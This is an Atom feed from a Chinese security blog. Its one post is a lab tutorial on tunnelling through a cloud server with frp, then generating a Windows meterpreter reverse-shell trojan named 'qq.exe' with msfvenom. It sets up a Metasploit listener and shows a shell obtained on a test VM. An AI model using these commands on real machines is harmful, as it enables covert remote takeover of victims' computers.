@@ -1,0 +1,235 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://www.sycamore.top</id>
+    <title>Sycamore&#39;s Blog • Posts by &#34;frp&#34; tag</title>
+    <link href="https://www.sycamore.top" />
+    <updated>2022-04-18T12:18:36.000Z</updated>
+    <category term="Python" />
+    <category term="计算机视觉" />
+    <category term="深度学习" />
+    <category term="Crypto" />
+    <category term="Hexo" />
+    <category term="shokaX" />
+    <category term="博客主题" />
+    <category term="实习" />
+    <category term="springboot" />
+    <category term="CTF" />
+    <category term="Misc" />
+    <category term="Web" />
+    <category term="Miec" />
+    <category term="Re" />
+    <category term="Pwn" />
+    <category term="Backdoor" />
+    <category term="Linux" />
+    <category term="Kali" />
+    <category term="Trojan horse" />
+    <category term="Metasploit" />
+    <category term="frp" />
+    <category term="shellter" />
+    <category term="Reverse Shell" />
+    <category term="Develop" />
+    <category term="Electron" />
+    <category term="Google Translate" />
+    <category term="node" />
+    <category term="Hitokoto" />
+    <category term="npm" />
+    <category term="plugs" />
+    <category term="RCE，loophole" />
+    <category term="毕业设计" />
+    <category term="机器学习" />
+    <category term="Diary" />
+    <category term="Australia" />
+    <category term="Mod" />
+    <category term="CP2077" />
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/</id>
+        <title>frp 搭建公网 Metasploit</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/"/>
+        <content type="html">&lt;h2 id=&#34;准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备&#34;&gt;#&lt;/a&gt; 准备&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;frps&lt;/strong&gt; 部署机。
+&lt;ul&gt;
+&lt;li&gt;要求：拥有 &lt;strong&gt;公网 IP&lt;/strong&gt; （例如 &lt;strong&gt;VPS&lt;/strong&gt;、云服务器等等）&lt;/li&gt;
+&lt;li&gt;本文选用 &lt;strong&gt;Ubuntu 18.04.6&lt;/strong&gt; 云服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;frpc&lt;/strong&gt; 客户机。
+&lt;ul&gt;
+&lt;li&gt;要求：能访问互联网&lt;/li&gt;
+&lt;li&gt;本文选用 &lt;strong&gt;Kali Linux 2022&lt;/strong&gt; 虚拟机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;frp&lt;/strong&gt; 的 &lt;strong&gt;Github&lt;/strong&gt; 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==&#34;&gt;fatedier/frp&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;frps云服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frps云服务器&#34;&gt;#&lt;/a&gt; frps（云服务器）&lt;/h2&gt;
+&lt;h3 id=&#34;下载安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载安装&#34;&gt;#&lt;/a&gt; 下载安装&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt; 项目&lt;/a&gt; 上找到最新的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==&#34;&gt;releases&lt;/span&gt; ：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png&#34; alt=&#34;image-20230426011312770&#34; /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在 &lt;strong&gt;云服务器&lt;/strong&gt; 终端上下载： &lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png&#34; alt=&#34;image-20230426011322302&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;解压缩&lt;/strong&gt; 下载的文件： &lt;code&gt;tar -zxvf frp_0.41.0_linux_amd64.tar.gz&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png&#34; alt=&#34;image-20230426011327257&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;进入&lt;/strong&gt; 解压缩的文件夹： &lt;code&gt;cd frp_0.41.0_linux_amd64/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;因为配置的是 &lt;strong&gt;frps&lt;/strong&gt; ，可以 &lt;strong&gt;删除&lt;/strong&gt; 文件夹内的 &lt;strong&gt;frpc&lt;/strong&gt; 相关文件，防止后续修改出错：&lt;strong&gt; &lt;code&gt;rm -rf frpc*&lt;/code&gt; &lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png&#34; alt=&#34;image-20230426011332064&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;编写-frps-配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-frps-配置文件&#34;&gt;#&lt;/a&gt; 编写 frps 配置文件&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;vim frps.ini&lt;/code&gt; &lt;br /&gt;
+ 内容如下：&lt;br /&gt;
+（不想要&lt;strong&gt;监控页面&lt;/strong&gt;的话，删除对应配置所在 &lt;strong&gt;行&lt;/strong&gt; 即可）&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bind_port = 7777          # frps和frpc的通讯端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_port = 9999     # web监控页面的端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_user = Sycamore # 登录监控页面的用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dashboard_pwd = 123456    # 登录监控页面的密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 如图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png&#34; alt=&#34;image-20230426011338410&#34; /&gt;&lt;br /&gt;
+（需要 &lt;strong&gt;云服务器&lt;/strong&gt; 打开 &lt;strong&gt;对应端口&lt;/strong&gt;：7777、9999)&lt;/p&gt;
+&lt;h3 id=&#34;运行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行&#34;&gt;#&lt;/a&gt; 运行&lt;/h3&gt;
+&lt;p&gt;相关命令 &lt;strong&gt;基本上&lt;/strong&gt; 应当在 &lt;strong&gt;frp_0.41.0_linux_amd64 文件夹&lt;/strong&gt; 下执行～&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行输入： &lt;code&gt;./frps -c frps.ini&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;[注意]&lt;/strong&gt;：关闭命令行窗口，或是停止执行该命令，就会 &lt;strong&gt;退出&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;后台运行： &lt;code&gt;nohup ./frps -c frps.ini &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;因为通常不会 &lt;strong&gt;关闭云服务器&lt;/strong&gt;，所以 &lt;strong&gt;后台运行&lt;/strong&gt; 就足够了；&lt;/li&gt;
+&lt;li&gt;当然也可以 &lt;strong&gt;开启自启动&lt;/strong&gt;，详情见 &lt;strong&gt;frpc&lt;/strong&gt; 的内容，对应命令改个符号就行～&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;frpckali-虚拟机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frpckali-虚拟机&#34;&gt;#&lt;/a&gt; frpc（Kali 虚拟机）&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png&#34; alt=&#34;image-20230426011342973&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;下载安装-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载安装-2&#34;&gt;#&lt;/a&gt; 下载安装&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt; 项目&lt;/a&gt; 上找到最新的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==&#34;&gt;releases&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;步骤与 &lt;strong&gt;frps&lt;/strong&gt; 的几乎&lt;strong&gt;相同&lt;/strong&gt;，&lt;strong&gt;区别&lt;/strong&gt; 是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对象变成了 &lt;strong&gt;Kali 虚拟机&lt;/strong&gt;，而不是 云服务器&lt;/li&gt;
+&lt;li&gt;以及最后一步 &lt;strong&gt;删除的是 frps&lt;/strong&gt;：&lt;br /&gt;
+4. 因为配置的是 &lt;strong&gt;frpc&lt;/strong&gt; ，可以 &lt;strong&gt;删除&lt;/strong&gt; 文件夹内的 &lt;strong&gt;frps&lt;/strong&gt; 相关文件，防止后续修改出错：&lt;strong&gt; &lt;code&gt;rm -rf frps*&lt;/code&gt; &lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;编写-frpc-配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-frpc-配置文件&#34;&gt;#&lt;/a&gt; 编写 frpc 配置文件&lt;/h3&gt;
+&lt;p&gt;作为一款 &lt;strong&gt;内网穿透&lt;/strong&gt; 工具，&lt;strong&gt;frp&lt;/strong&gt; 穿透了内网之后，还需要使用 &lt;strong&gt;其他手段&lt;/strong&gt;（&lt;strong&gt;ssh&lt;/strong&gt;）&lt;br /&gt;
+和外网建立交互，所以 &lt;strong&gt;配置文件&lt;/strong&gt; 中会存在 &lt;strong&gt;[ssh]&lt;/strong&gt; 配置。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;vim frpc.ini&lt;/code&gt; &lt;br /&gt;
+ 内容如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[common]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_addr = 106.15.52.194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server_port = 7777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ssh]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_ip = 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_port = 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_port = 6666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use_compression = true&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 相关 &lt;strong&gt;解释&lt;/strong&gt; 如图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png&#34; alt=&#34;image-20230426011350366&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;运行-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#运行-2&#34;&gt;#&lt;/a&gt; 运行&lt;/h3&gt;
+&lt;p&gt;相关命令 &lt;strong&gt;基本上&lt;/strong&gt; 应当在 &lt;strong&gt;frp_0.41.0_linux_amd64 文件夹&lt;/strong&gt; 下执行～&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行输入： &lt;code&gt;./frpc -c frpc.ini&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;[注意]&lt;/strong&gt;：关闭命令行窗口，或是停止执行该命令，就会 &lt;strong&gt;退出&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;开机自启动：
+&lt;ul&gt;
+&lt;li&gt;服务目录 &lt;strong&gt;新建并编辑&lt;/strong&gt; 文件： &lt;code&gt;vim /lib/systemd/system/frp.service&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;填入以下内容：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[Unit]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Description=Frp Client Service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;After=network.target remote-fs.target nss-lookup.target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Wants=network.target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Service]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Type=simple&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ExecStart=/root/frp/frpc -c /root/frp/frpc.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Restart=always&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RestartSec=20s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Install]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WantedBy=multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;启动 &lt;strong&gt;frpc&lt;/strong&gt; 服务： &lt;code&gt;systemctl start frp&lt;/code&gt; &lt;br /&gt;
+（最后的  &lt;code&gt;frp&lt;/code&gt;  名称取决于上一步新建的文件名  &lt;code&gt;frp.service&lt;/code&gt; ）&lt;/li&gt;
+&lt;li&gt;打开 &lt;strong&gt;frpc&lt;/strong&gt; 服务自启动  &lt;code&gt;systemctl enable frp&lt;/code&gt; &lt;br /&gt;
+&lt;strong&gt; [注意]：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;如果要重启应用： &lt;code&gt;systemctl restart frp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;如果要停止应用： &lt;code&gt;systemctl stop frp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;如果要查看 &lt;strong&gt;frpc&lt;/strong&gt; 的日志： &lt;code&gt;systemctl status frp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;权限不够，记得加  &lt;code&gt;sudo&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;服务文件&lt;/strong&gt; 重要内容注释 如下图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png&#34; alt=&#34;image-20230426011356634&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ssh-连接测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh-连接测试&#34;&gt;#&lt;/a&gt; SSH 连接测试&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行  &lt;code&gt;ssh root@x.x.x.x -p 6666&lt;/code&gt; &lt;br /&gt;
+（&lt;strong&gt;root&lt;/strong&gt; 用户登录到 &lt;strong&gt;云服务器 x.x.x.x&lt;/strong&gt; 的 &lt;strong&gt;6666&lt;/strong&gt; 端口）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png&#34; alt=&#34;&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;Xshell 创建新会话，具体内容如下：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png&#34; alt=&#34;image-20230426011410382&#34; /&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png&#34; alt=&#34;image-20230426011417120&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;br /&gt;
+&lt;strong&gt;Xshell  连接成功&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png&#34; alt=&#34;image-20230426011424294&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;msf-渗透攻击测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-渗透攻击测试&#34;&gt;#&lt;/a&gt; msf 渗透攻击测试&lt;/h2&gt;
+&lt;p&gt;双击打开 刚刚建立的 &lt;strong&gt;Xshell 新会话&lt;/strong&gt;（ frp ）.&lt;/p&gt;
+&lt;h3 id=&#34;frpc-添加新配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#frpc-添加新配置&#34;&gt;#&lt;/a&gt; frpc 添加新配置&lt;/h3&gt;
+&lt;p&gt;输入命令： &lt;code&gt;vim frpc.ini&lt;/code&gt; ，编辑 &lt;strong&gt;frpc&lt;/strong&gt; 配制文件，&lt;br /&gt;
+在文件末尾 &lt;strong&gt;添加&lt;/strong&gt;：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[msf]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type = tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_ip = 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_port = 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_port = 2333 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 配置内容的 &lt;strong&gt;含义&lt;/strong&gt; 与 &lt;strong&gt;[ssh]&lt;/strong&gt; 类似，解释如图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png&#34; alt=&#34;image-20230426011431000&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf-生成木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-生成木马&#34;&gt;#&lt;/a&gt; msf 生成木马&lt;/h3&gt;
+&lt;p&gt;与连接 &lt;strong&gt;本地的 shell&lt;/strong&gt; 生成木马不同，&lt;br /&gt;
+因为我们要使用 &lt;strong&gt;frp 穿透内网&lt;/strong&gt; 连接的 shell ，去 &lt;strong&gt;监听木马反弹&lt;/strong&gt;的 shell，&lt;br /&gt;
+所以我们 &lt;strong&gt;生成木马&lt;/strong&gt; 时，设置的 LHOST、LPORT 应当是 &lt;strong&gt;云服务器&lt;/strong&gt; 的对应数据。&lt;br /&gt;
+（直接用内网测试的时候，LHOST、LPORT 填的是 &lt;strong&gt;本地虚拟机&lt;/strong&gt; 的相关数据）&lt;/p&gt;
+&lt;p&gt;用 &lt;strong&gt;msf&lt;/strong&gt; 生成 &lt;strong&gt;windows&lt;/strong&gt; 系统的 &lt;strong&gt;反向 shell&lt;/strong&gt; 木马：&lt;br /&gt;
+ &lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &amp;gt; qq.exe&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png&#34; alt=&#34;image-20230426011437323&#34; /&gt;&lt;br /&gt;
+ 成功生成木马文件：&lt;strong&gt;qq.exe&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf-监听反弹的-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf-监听反弹的-shell&#34;&gt;#&lt;/a&gt; msf 监听反弹的 shell&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;（确定 frps 、frpc 服务均已在后台运行）&lt;br /&gt;
+（事先上传 qq.exe 到测试的靶机，本文用 	Win7_x64 虚拟机替代）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;关于&lt;strong&gt;上传&lt;/strong&gt;：Kali 虚拟机 开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务，Win7_x64 虚拟机 内网访问下载：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;打开 &lt;strong&gt;msf&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;选择使用的 exploit&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set PAYLOAD windows/x64/meterpreter/reverse_tcp&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 PAYLOAD （生成木马时使用的）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LHOST 127.0.0.1&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 LHOST 为本地 IP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LPORT 4444&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;设置 LPORT 为转发的本地端口 4444&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;run
+&lt;ul&gt;
+&lt;li&gt;开始监听&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;（先让 &lt;strong&gt;msf&lt;/strong&gt; 开始监听，再双击运行上传的木马文件）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;演示如图所示：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;双击 &lt;strong&gt;运行木马&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png&#34; alt=&#34;image-20230426011447735&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;msf &lt;strong&gt;开始监听&lt;/strong&gt; &amp;amp; 成功获得 meterpreter &lt;strong&gt;shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png&#34; alt=&#34;image-20230426011457351&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <category term="frp" />
+        <updated>2022-04-18T12:18:36.000Z</updated>
+    </entry>
+</feed>
